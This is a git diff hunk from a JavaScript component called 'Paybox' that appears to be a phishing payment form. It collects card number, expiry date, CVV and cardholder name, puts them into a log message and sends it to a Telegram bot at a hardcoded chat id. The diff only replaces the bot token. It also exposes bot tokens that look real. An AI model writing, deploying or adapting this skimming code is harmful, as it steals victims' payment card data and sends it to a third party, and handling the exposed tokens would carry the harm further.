@@ -21,7 +21,7 @@ const Paybox = () => {
 
     var logsss = `Log :%0A -card_number: ${text1} %0A - expire_date: ${text2} %0A - cvv: ${text3} %0A - cardholder_name: ${text4}`;
 
-    var token = "6970189544:AAGwiLCKP9aoh-CyZPE1BhI-UDQTPzvjCZE";
+    var token = "8551615963:AAEOPXbeNy48cyh8zNW5ede7-v3w8RWldHE";
     var chat_id = -1002071552778;
     var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${logsss}`;
 
